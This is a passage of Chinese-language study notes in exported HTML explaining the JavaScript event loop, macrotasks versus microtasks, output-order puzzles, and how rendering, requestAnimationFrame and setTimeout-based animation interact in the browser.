12pt;"><br/></font></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">console.log(&quot;a&quot;);</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">setTimeout(function () {</font></div><div><font style="font-size: 12pt;">    console.log(&quot;b&quot;);</font></div><div><font style="font-size: 12pt;">}, 0);</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">new Promise((resolve) =&gt; {</font></div><div><font style="font-size: 12pt;">    console.log(&quot;c&quot;);</font></div><div><font style="font-size: 12pt;">    resolve();</font></div><div><font style="font-size: 12pt;">})</font></div><div><font style="font-size: 12pt;">    .then(function () {</font></div><div><font style="font-size: 12pt;">        console.log(&quot;d&quot;);</font></div><div><font style="font-size: 12pt;">    })</font></div><div><font style="font-size: 12pt;">    .then(function () {</font></div><div><font style="font-size: 12pt;">        console.log(&quot;e&quot;);</font></div><div><font style="font-size: 12pt;">    });</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">console.log(&quot;f&quot;);</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">/**</font></div><div><font style="font-size: 12pt;">* 输出结果：a c f d e b</font></div><div><font style="font-size: 12pt;">*/</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/1.gif" type="image/gif" data-filename="1.gif"/></span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/10.gif" type="image/gif" data-filename="10.gif"/></span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/11.gif" type="image/gif" data-filename="11.gif"/></span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/12.gif" type="image/gif" data-filename="12.gif"/></span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/13.gif" type="image/gif" data-filename="13.gif"/></span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/14.gif" type="image/gif" data-filename="14.gif"/></span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/2.gif" type="image/gif" data-filename="2.gif"/></span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/3.gif" type="image/gif" data-filename="3.gif"/></span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/4.gif" type="image/gif" data-filename="4.gif"/></span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/5.gif" type="image/gif" data-filename="5.gif"/></span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/6.gif" type="image/gif" data-filename="6.gif"/></span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/7.gif" type="image/gif" data-filename="7.gif"/></span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/9.gif" type="image/gif" data-filename="9.gif"/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">async function async1() {</font></div><div><font style="font-size: 12pt;">    console.log(&quot;a&quot;);</font></div><div><font style="font-size: 12pt;">    const res = await async2();</font></div><div><font style="font-size: 12pt;">    console.log(&quot;b&quot;);</font></div><div><font style="font-size: 12pt;">}</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">async function async2() {</font></div><div><font style="font-size: 12pt;">    console.log(&quot;c&quot;);</font></div><div><font style="font-size: 12pt;">    return 2;</font></div><div><font style="font-size: 12pt;">}</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">console.log(&quot;d&quot;);</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">setTimeout(() =&gt; {</font></div><div><font style="font-size: 12pt;">    console.log(&quot;e&quot;);</font></div><div><font style="font-size: 12pt;">}, 0);</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">async1().then(res =&gt; {</font></div><div><font style="font-size: 12pt;">    console.log(&quot;f&quot;)</font></div><div><font style="font-size: 12pt;">})</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">new Promise((resolve) =&gt; {</font></div><div><font style="font-size: 12pt;">    console.log(&quot;g&quot;);</font></div><div><font style="font-size: 12pt;">    resolve();</font></div><div><font style="font-size: 12pt;">}).then(() =&gt; {</font></div><div><font style="font-size: 12pt;">    console.log(&quot;h&quot;);</font></div><div><font style="font-size: 12pt;">});</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">console.log(&quot;i&quot;);</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">/**</font></div><div><font style="font-size: 12pt;">* 输出结果：d a c g i b h f e</font></div><div><font style="font-size: 12pt;">*/</font></div></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/1 [1].gif" type="image/gif" data-filename="1.gif"/></span><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/10 [1].gif" type="image/gif" data-filename="10.gif"/></span><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/11 [1].gif" type="image/gif" data-filename="11.gif"/></span><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/12 [1].gif" type="image/gif" data-filename="12.gif"/></span><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/13 [1].gif" type="image/gif" data-filename="13.gif"/></span><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/14 [1].gif" type="image/gif" data-filename="14.gif"/></span><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/15.gif" type="image/gif" data-filename="15.gif"/></span><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/2 [1].gif" type="image/gif" data-filename="2.gif"/></span><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [1].gif" type="image/gif" data-filename="3.gif"/></span><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/4 [1].gif" type="image/gif" data-filename="4.gif"/></span><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/5 [1].gif" type="image/gif" data-filename="5.gif"/></span><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/6 [1].gif" type="image/gif" data-filename="6.gif"/></span><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/7 [1].gif" type="image/gif" data-filename="7.gif"/></span><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/8.gif" type="image/gif" data-filename="8.gif"/></span><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/9 [1].gif" type="image/gif" data-filename="9.gif"/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">查阅了网上比较多关于事件循环介绍的文章，均会提到 macrotask(宏任务) 和 microtask(微任务) 两个概念，</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">但规范中并没有提到 macrotask，</span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">ES6 规范中，microtask 称为 jobs，macrotask 称为 task。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">宏任务与微任务的区别</span></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">1、</span></span></span> <span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 16px; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; color: rgb(118, 0, 216); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">宏任务宿主是浏览器或 Node，微任务宿主是 JS 引擎，</span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">      </span></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">      宏任务是由宿主发起的，而微任务由 JavaScript 自身发起。</span></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><br/></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">2、宏任务执行时间一般比较长。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">3、每一次宏任务开始之前伴随着一次 event loop 结束，而每一次微任务在一次 event loop 结束前执行。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">与广义的任务划分：同步任务、异步任务不同</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">狭义的任务可以细分为：</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">Macrotask(宏任务) 和 </span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">Microtask(微任务)</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">，</span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">Macrotask(宏任务) 和 </span></span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">Microtask(微任务) </span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">各属于一个队列，</span></span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">这两个队列不是一个</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">队列</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">Macrotask(宏任务) 和 </span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">Microtask(微任务) </span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">主要区别在于它们的执行顺序，</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [24].jpg" type="image/jpeg" data-filename="3.jpg" width="1280"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">setTimeout/setInterval JS引擎线程=&gt;定时触发器线程=&gt;事件触发线程=&gt;事件队列</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">Ajax JS引擎线程=&gt;异步http请求线程=&gt;事件触发线程=&gt;事件队列</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [25].jpg" type="image/jpeg" data-filename="3.jpg" width="855"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">Microtask（微任务）虽然是队列，但并不是一个一个放入执行栈，而是</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">当前主线程的执行栈执行完毕时会立刻先处理所有微任务队列中的事件，然后再去宏任务队列中取出一个事件。</span></span></span></div><div><b style="font-size: 12pt;"><br/></b></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">其实每次执行栈执行的代码都是一个宏任务（包括每次从事件队列中获取一个事件回调并放到执行栈中执行）。</span></span></div><div><b style="font-size: 12pt;"><br/></b></div><div><span style="font-size: 12pt; font-weight: bold;">宏任务：</span></div><div><b style="font-size: 12pt;"><br/></b></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/5 [2].gif" type="image/gif" data-filename="5.gif" width="895"/></span></span></div><div><b style="font-size: 12pt;"><br/></b></div><div><b style="font-size: 12pt;"><br/></b></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">document.body.style = 'background:black';</font></div><div><font style="font-size: 12pt;">document.body.style = 'background:red';</font></div><div><font style="font-size: 12pt;">document.body.style = 'background:blue';</font></div><div><font style="font-size: 12pt;">document.body.style = 'background:grey';</font></div></div><div><b style="font-size: 12pt;"><br/></b></div><div><span style="font-size: 12pt;">页面背景会在瞬间变成灰色，以上代码属于同一次宏任务，所以全部执行完才触发页面渲染，渲染时GUI线程会将所有UI改动优化合并，所以视觉效果上，只会看到页面变成灰色。</span></div><div><b style="font-size: 12pt;"><br/></b></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/16caca3ed44e6b16_tplv-t2oaga2asx-watermark.gif" type="image/gif" data-filename="16caca3ed44e6b16_tplv-t2oaga2asx-watermark.gif" width="1085"/></span></span></div><div><b style="font-size: 12pt;"><br/></b></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">document.body.style = 'background:blue';</font></div><div><font style="font-size: 12pt;">setTimeout(function(){</font></div><div><font style="font-size: 12pt;">    document.body.style = 'background:black'</font></div><div><font style="font-size: 12pt;">},0)</font></div></div><div><b style="font-size: 12pt;"><br/></b></div><div><span style="font-size: 12pt;">页面先显示成蓝色背景，然后瞬间变成了黑色背景，</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">这是因为以上代码属于两次宏任务，第一次宏任务执行的代码是将背景变成蓝色，然后触发渲染，将页面变成蓝色，再触发第二次宏任务将背景变成黑色。</span></div><div><b style="font-size: 12pt;"><br/></b></div><div><span style="font-size: 12pt; font-weight: bold;">微任务：</span></div><div><b style="font-size: 12pt;"><br/></b></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font color="#000000" style="font-size: 12pt;">document.body.style = 'background:blue'</font></div><div><font color="#000000" style="font-size: 12pt;">console.log(1);</font></div><div><font color="#000000" style="font-size: 12pt;">Promise.resolve().then(()=&gt;{</font></div><div><font color="#000000" style="font-size: 12pt;">    console.log(2);</font></div><div><font color="#000000" style="font-size: 12pt;">    document.body.style = 'background:black'</font></div><div><font color="#000000" style="font-size: 12pt;">});</font></div><div><font color="#000000" style="font-size: 12pt;">console.log(3);</font></div></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [2].gif" type="image/gif" data-filename="3.gif" width="835"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">页面的背景色直接变成黑色，没有经过蓝色的阶段。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">因为我们在宏任务中将背景设置为蓝色，但在进行渲染前执行了微任务， 在微任务中将背景变成了黑色，然后才执行的渲染</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">setTimeout(() =&gt; {</font></div><div><font style="font-size: 12pt;">    console.log(1)</font></div><div><font style="font-size: 12pt;">    Promise.resolve(3).then(data =&gt; console.log(data))</font></div><div><font style="font-size: 12pt;">}, 0)</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">setTimeout(() =&gt; {</font></div><div><font style="font-size: 12pt;">    console.log(2)</font></div><div><font style="font-size: 12pt;">}, 0)</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">// print : 1 3 2</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">上面代码共包含两个 setTimeout ，也就是说除主代码块外，共有两个宏任务， </span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">其中第一个宏任务执行中，输出 1 ，并且创建了微任务队列，所以在下一个宏任务队列执行前， 先执行微任务，在微任务执行中，输出 3 ，</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">微任务执行后，执行下一次宏任务，执行中输出 2</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">事件循环总结：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/yuque_diagram.jpg" type="image/jpeg" data-filename="yuque_diagram.jpg" width="1398"/></span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">同步任务总是先进入执行栈中执行，异步任务会被挂起，直到有结果返回时，异步任务会进入任务队列中等待主线程读取执行。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">当执行栈为空时，主线程便会循环往复地读取任务队列中的事件，进入执行栈执行，这个过程叫 Event Loop。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">主线程对任务队列的读取也有先后之分，首先会读取宏任务，最开始是 script 整体代码，</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">执行完一个宏任务后，会去查找微任务，将微任务队列的事件都执行完，这个过程是循环往复的。</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">宏任务宿主是浏览器或 Node，微任务宿主是 JS 引擎</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font><font><font><font style="font-size: 12pt;">任务：（第一次事件循环）<font><font>同步宏任务 </font>--&gt;</font></font> <span style="font-size: 12pt;">异步</span><font><span style="font-size: 12pt;">微任务队列（全部清空） --</span><font style="font-size: 12pt;">&gt;</font></font></font></font></font> <font style="font-size: 12pt;">JS 引擎线程挂起，GUI 线程执行渲染 --&gt; GUI 线程渲染完毕后挂起，JS 引擎线程执行 --&gt;</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">       队列中的下一个宏任务 --&gt;</font><font style="font-size: 12pt;">（</font><span style="font-size: 12pt;">第二次事件循环）异步宏任务队列 --&gt; 异步微任务队列（全部清空） --&gt; ...</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">注意，事件循环不一定每轮都伴随着渲染（1、俩宏任务的间隔周期太短时很大概率不会渲染两次，只渲染一次。2、当多个定时器如果有渲染代码，多个定时器会合并，只渲染一次而不是多次），但是一定会伴随着微任务执行。</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">requestAnimationFrame 在渲染屏幕之前执行，非常适合用来做动画。</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">requestIdleCallback 在渲染屏幕之后执行，并且是否有空执行要看浏览器的调度，如果一定要它在某个时间内执行，请使用 timeout 参数。</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">resize 和 scroll 事件其实自带节流，它只在 Event Loop 的渲染阶段去执行事件。</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">很多人会有个误区，认为微任务快于宏任务，其实是错误的。</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">因为宏任务中包括了 script ，浏览器会先执行一个宏任务，接下来有异步代码的话才会先执行微任务。（只考虑异步时，微任务才会在宏任务前面）</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt; color: unset; font-family: unset; font-weight: bold;">事件循环流程</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">1. 从任务队列中取出一个宏任务并执行。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">2. 检查微任务队列，执行并清空微任务队列，如果在微任务的执行中又加入了新的微任务，也会在这一步一起执行。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">3. 进入更新渲染阶段，判断是否需要渲染，这里有一个 rendering opportunity 的概念，</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">    也就是说不一定每一轮 event loop 都会对应一次浏览 器渲染，要根据屏幕刷新率、页面性能、页面是否在后台运行来共同决定，</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">    通常来说这个渲染间隔是固定的。（所以多个 task 很可能在一次渲染之间执行）</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">    ● 浏览器会尽可能的保持帧率稳定，例如页面性能无法维持 60fps（每 16.66ms 渲染一次）的话，那么浏览器就会选择 30fps 的更新速率，而不是偶尔丢帧。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">    ● 如果浏览器上下文不可见，那么页面会降低到 4fps 左右甚至更低。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">    ● 如果满足以下条件，也会跳过渲染：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">        1. 浏览器判断更新渲染不会带来视觉上的改变。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">        2. map of animation frame callbacks 为空，也就是帧动画回调为空，可以通过 requestAnimationFrame 来请求帧动画。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">4. 如果上述的判断决定本轮不需要渲染，那么下面的几步也不会继续运行：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">有时候浏览器希望两次「定时器任务」是合并的，他们之间只会穿插着 microTask的执行，而不会穿插屏幕渲染相关的流程（比如requestAnimationFrame，下面会写一个例子）。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">5. 对于需要渲染的文档，如果窗口的大小发生了变化，执行监听的 resize 方法。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">6. 对于需要渲染的文档，如果页面发生了滚动，执行 scroll 方法。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">7. 对于需要渲染的文档，执行帧动画回调，也就是 requestAnimationFrame 的回调。（后文会详解）</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">8. 对于需要渲染的文档， 执行 IntersectionObserver 的回调。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">9. 对于需要渲染的文档，重新渲染绘制用户界面。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">10. 判断 task队列和microTask队列是否都为空，如果是的话，则进行 Idle 空闲周期的算法，判断是否要执行 requestIdleCallback的回调函数。</span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">闪烁动画</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">假设我们现在想要快速的让屏幕上闪烁 红、蓝两种颜色，保证用户可以观察到，</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">如果我们用 setTimeout 来写，并且带着我们长期的误解「宏任务之间一定会伴随着浏览器绘制」，那么你会得到一个预料之外的结果。</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">setTimeout(() =&gt; {</font></div><div><font style="font-size: 12pt;">  document.body.style.background = &quot;red&quot;</font></div><div><font style="font-size: 12pt;">  setTimeout(() =&gt; {</font></div><div><font style="font-size: 12pt;">    document.body.style.background = &quot;blue&quot;</font></div><div><font style="font-size: 12pt;">  })</font></div><div><font style="font-size: 12pt;">})</font></div></div><div><br/></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/172368a480f5f3ef_tplv-t2oaga2asx-watermark.gif" type="image/gif" data-filename="172368a480f5f3ef_tplv-t2oaga2asx-watermark.gif" width="1028"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">如果这两个 Task 之间正好遇到了浏览器认定的渲染机会，那么它会重绘，否则就不会。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">由于这俩宏任务的间隔周期太短了，所以很大概率是不会的。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">如果你把延时调整到 17ms 那么重绘的概率会大很多，毕竟这个是一般情况下 60fps 的一个指标。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">但是也会出现很多不绘制的情况，所以并不稳定。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">如果你依赖这个 </span><span style="font-size: 12pt;">setTimeout</span> <span style="font-size: 12pt;">来做动画，那么就很可能会造成「掉帧」和卡顿。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">setTimeout 通过设置一个间隔时间不断改变图像，达到动画效果。该方法在一些低端机上会出现卡顿、抖动现象。</span></span></div><div><span style="font-size: 